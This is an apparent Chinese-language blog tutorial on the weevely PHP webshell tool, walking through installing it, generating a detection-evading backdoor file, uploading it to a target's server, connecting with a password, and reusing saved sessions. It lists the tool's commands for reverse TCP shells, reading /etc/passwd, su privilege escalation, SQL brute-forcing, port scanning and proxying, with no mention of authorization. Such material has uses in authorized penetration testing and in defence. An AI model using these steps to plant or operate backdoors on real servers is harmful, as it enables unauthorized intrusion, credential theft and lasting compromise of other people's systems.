<!DOCTYPE html><html lang="en"><head><meta charset="utf-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1" /><meta name="baidu-site-verification" content="gDf3P6sfyW" /><meta name="360-site-verification" content="0c91ee58977e5924d92896a89289b668" /><meta name="sogou_site_verification" content="jHNtHqKt34"/><meta name="google-site-verification" content="An2eGWQakKFcIZ1YuwZSilNuSYlfHs1zH0Hr-OMW6oQ" /><title>生成、管理、连接php后门webshell工具weevely的使用</title><meta name="description" content=""><meta name="keywords" content="php后门,webshell,weevely"><link rel="icon" href="/assets/favicon.ico"><link rel="apple-touch-icon" href="/assets/touch-icon.png"><link rel="stylesheet" href="/assets/core.css"><link rel="canonical" href="/2016/04/weevely-php-webshell/"><link rel="alternate" type="application/atom+xml" title="Vinny's Blog - 王俊博客 - 交流软件领域知识 | 纪录点滴精彩人生" href="/feed.xml" /></head><body><nav class="header-nav"> <a class="page-link" href="/">HOME</a> / <a class="page-link" href="/categories/">CATEGORY</a> / <a class="page-link" href="/feed.xml">FEED</a> / <a class="page-link" href="/about/">ABOUT</a></nav><main> <noscript><style> article .footnotes { display: block; }</style></noscript><article><div class="center"><h1>生成、管理、连接php后门webshell工具weevely的使用</h1><time>2016-04-13</time></div><div class="divider"></div><ul id="markdown-toc"><li><a href="#生成管理连接php后门webshell工具weevely的使用" id="markdown-toc-生成管理连接php后门webshell工具weevely的使用">生成、管理、连接php后门webshell工具weevely的使用</a><ul><li><a href="#1-介绍" id="markdown-toc-1-介绍">1. 介绍</a></li><li><a href="#2-特性" id="markdown-toc-2-特性">2. 特性</a></li><li><a href="#3-依赖安装" id="markdown-toc-3-依赖安装">3. 依赖安装</a></li><li><a href="#4-使用" id="markdown-toc-4-使用">4. 使用</a><ul><li><a href="#41-生成php后门文件" id="markdown-toc-41-生成php后门文件">4.1 生成php后门文件</a></li><li><a href="#42-上传后门文件" id="markdown-toc-42-上传后门文件">4.2 上传后门文件</a></li><li><a href="#43-shell连接后门文件" id="markdown-toc-43-shell连接后门文件">4.3 shell连接后门文件</a></li></ul></li><li><a href="#5-weevely内部命令" id="markdown-toc-5-weevely内部命令">5. weevely内部命令</a></li></ul></li></ul><hr /><h1 id="生成管理连接php后门webshell工具weevely的使用">生成、管理、连接php后门webshell工具weevely的使用</h1><h2 id="1-介绍">1. 介绍</h2><p><strong><a href="https://github.com/epinna/weevely3">weevely</a></strong>是一种命令行的webshell，它能生成php后门文件以及连接的功能。提供类似与ssh命令行终端的操作方式，weevely每次生成的webshell都不一样，所以可以有效的避免安全系统的查杀。</p><h2 id="2-特性">2. 特性</h2><ul><li>SSH终端的操作</li><li>在目标主机上运行sql控制台</li><li>在目标主机上使用代理服务</li><li>主机配置安全审计</li><li>挂在目标系统文件到本地</li><li>在目标主机上进行扫描</li><li>文件上传和下载</li><li>正向反向TCPshell</li><li>暴力破解</li><li>管理压缩归档</li></ul><h2 id="3-依赖安装">3. 依赖安装</h2><p>由于weevely是python程序编写，所以需要安装python2.7的环境以及下载weevely的主程序包，另外还需要安装weevely的python依赖库，如下：</p><p><strong>linux依赖库安装</strong></p><div class="language-shell highlighter-rouge"><pre class="highlight"><code>sudo apt-get install g++ python-pip libyaml-dev python-dev
sudo pip install prettytable Mako PyYAML python-dateutil PySocks –upgrade
</code></pre></div><p><strong>osx依赖库安装</strong></p><div class="language-shell highlighter-rouge"><pre class="highlight"><code>sudo port install python27 py27-pip
sudo port <span class="k">select</span> –set pip pip27
sudo port <span class="k">select</span> –set python python27
sudo pip install prettytable Mako PyYAML python-dateutil readline PySocks –upgrade
</code></pre></div><p><strong>windows依赖库安装</strong></p><div class="language-shell highlighter-rouge"><pre class="highlight"><code>pip install prettytable Mako PyYAML python-dateutil pyreadline PySocks –upgrade
</code></pre></div><h2 id="4-使用">4. 使用</h2><h3 id="41-生成php后门文件">4.1 生成php后门文件</h3><div class="language-shell highlighter-rouge"><pre class="highlight"><code><span class="c"># weevely generate &lt;连接密码&gt; &lt;后门保存路径&gt;</span>
weevely generate 123321 /root/b.php
</code></pre></div><h3 id="42-上传后门文件">4.2 上传后门文件</h3><p>无论你用什么方式，只要把后门文件放到对方服务器中，且通过浏览器能访问到，可能是白板，但不会有404错误。</p><h3 id="43-shell连接后门文件">4.3 shell连接后门文件</h3><div class="language-shell highlighter-rouge"><pre class="highlight"><code><span class="c"># weevely &lt;服务器后面HTTP路径&gt; &lt;连接密码&gt;</span>
weevely http://vinny.cc/b.php 123321
</code></pre></div><p><img src="http://ohdpyqlwy.bkt.clouddn.com/weevely-1.png" alt="weevely" /></p><blockquote><p><strong>weevely</strong>可以保存连接的<strong>session</strong>，此<strong>session</strong>并非是http里会话的概念，weevely的session保存的是站点的连接信息，通常情况下会保存在”~/.weevely/sessions/站点域名/后面文件名_x.session”中，如：”/root/.weevely/sessions/www.wangjunneil.com/b_0.session”。那么在下次连接到后面时可以通过此session文件进行连接，如下：</p></blockquote><div class="language-shell highlighter-rouge"><pre class="highlight"><code><span class="c"># weevely session &lt;session文件路径&gt; &lt;shell命令&gt;</span>
weevely session /root/.weevely/sessions/www.wangjunneil.com/b_0.session
weevely session /root/.weevely/sessions/www.wangjunneil.com/b_0.session ls -al
</code></pre></div><h2 id="5-weevely内部命令">5. weevely内部命令</h2><div class="highlighter-rouge"><pre class="highlight"><code>weevely&gt; help
 
 :audit_filesystem     审计系统文件错误的权限
 :audit_etcpasswd      查看linux系统下/etc/passwd的口令文件
 :audit_phpconf        查看当前系统php的配置信息
 :audit_suidsgid       通过SUID或SGID查找文件
 :shell_su             使用su命令提权
 :shell_sh             运行一个shell命令
 :shell_php            运行一个php命令
 :system_extensions    查看php和server服务器的扩展
 :system_info          全局查看系统信息
 :backdoor_tcp         Spawn a shell on a TCP port.
 :backdoor_reversetcp  运行一个反向TCP shell
 :bruteforce_sql       暴力破解SQL数据库
 :file_grep            查找匹配的文件
 :file_zip             压缩或解压缩zip文件
 :file_upload2web      Upload file automatically to a web folder and get corresponding URL.
 :file_enum            Check existence and permissions of a list of paths.
 :file_read            从远程系统读取文件
 :file_cd              切换目录
 :file_ls              列出目录内容
 :file_rm              删除文件
 :file_check           获取文件信息
 :file_gzip            压缩或解压缩gzip文件
 :file_cp              复制单个文件
 :file_tar             压缩或解压缩tar文件
 :file_bzip2           压缩或解压缩bzip2文件
 :file_upload          上传文件
 :file_webdownload     Download URL to the filesystem
 :file_touch           改变文件时间戳
 :file_edit            编辑文件
 :file_find            用给出的名称和属性查找文件
 :file_download        下载文件
 :file_mount           使用HTTPfs挂在远程文件系统到本地
 :sql_dump             Multi dbms mysqldump replacement.
 :sql_console          打开SQL控制台
 :net_curl             Perform a curl-like HTTP request.
 :net_scan             TCP端口扫描
 :net_ifconfig         获取网卡信息
 :net_proxy            开启本地代理
 :net_phpproxy         在系统中安装php代理
</code></pre></div><div class="divider"></div><blockquote id='by-nc-nd'><div> 版权所有，本作品采用<a rel="license" href="http://creativecommons.org/licenses/by-nc/3.0/">知识共享署名-非商业性使用 3.0 未本地化版本许可协议</a>进行许可。转载请注明出处：<a href="http://localhost:4000//2016/04/weevely-php-webshell/" akt="">http://localhost:4000//2016/04/weevely-php-webshell/</a></div></blockquote><div class="divider"></div><a class="w-toplink active" href="#" title="Back to top">^</a> <!-- 多说评论框 start --><div class="ds-thread" data-thread-key="29bca95032aff645a6f67f03e45bddfb" data-title="生成、管理、连接php后门webshell工具weevely的使用" data-url="/2016/04/weevely-php-webshell/"></div><!-- 多说评论框 end --></article><div class="page-navigation"> <a class="next" href="/2016/04/how-to-use-ettercap/" title="NEXT: ettercap的arp欺骗、嗅探数据、图片与dns欺骗过滤、替换">&lt;&lt;</a> <span> &middot; </span> <a class="home" href="/" title="Back to Homepage">首页</a> <span> &middot; </span> <a class="prev" href="/2016/04/linux-create-user-add/" title="PREV: 关于在linux中新建用户需要配置的一些参数备注">&gt;&gt;</a></div><!-- 多说公共JS代码 start (一个网页只需插入一次) --> <script type="text/javascript"> var duoshuoQuery = {short_name:"wangjunneil"}; (function() { var ds = document.createElement('script'); ds.type = 'text/javascript';ds.async = true; ds.src = (document.location.protocol == 'https:' ? 'https:' : 'http:') + '//static.duoshuo.com/embed.js'; ds.charset = 'UTF-8'; (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(ds); })(); </script> <!-- 多说公共JS代码 end --></main><div class="footer"> <!-- <span class="block">Made with &hearts; using <a href="http://jekyllrb.com/">Jekyll</a> &amp; <a href="https://github.com/heiswayi/the-plain" title="The Plain theme by Heiswayi Nrird">The Plain</a> &middot; &lt;/&gt; on <a href="https://github.com/wangjunneil" title="Hosted on GitHub">GitHub</a></span> --> <span class="block"><a href="https://vinny.cc">Vinny's Blog</a> © 2017 - All Rights Reserved</span></div><script> var _hmt = _hmt || []; (function() { var hm = document.createElement("script"); hm.src = "https://hm.baidu.com/hm.js?9c10955e76f3568532fff91d922d32ac"; var s = document.getElementsByTagName("script")[0]; s.parentNode.insertBefore(hm, s); })(); </script> <script> (function(){ var bp = document.createElement('script'); var curProtocol = window.location.protocol.split(':')[0]; if (curProtocol === 'https') { bp.src = 'https://zz.bdstatic.com/linksubmit/push.js'; } else { bp.src = 'http://push.zhanzhang.baidu.com/push.js'; } var s = document.getElementsByTagName("script")[0]; s.parentNode.insertBefore(bp, s); })(); </script> <script> (function(){ var src = (document.location.protocol == "http:") ? "http://js.passport.qihucdn.com/11.0.1.js?fa28985f7104be1c3ead0ecbe074eb24":"https://jspassport.ssl.qhimg.com/11.0.1.js?fa28985f7104be1c3ead0ecbe074eb24"; document.write('<script src="' + src + '" id="sozz"><\/script>'); })(); </script> <script> (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){ (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o), m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m) })(window,document,'script','https://www.google-analytics.com/analytics.js','ga'); ga('create', 'UA-88762290-1', 'auto'); ga('send', 'pageview'); </script></body></html>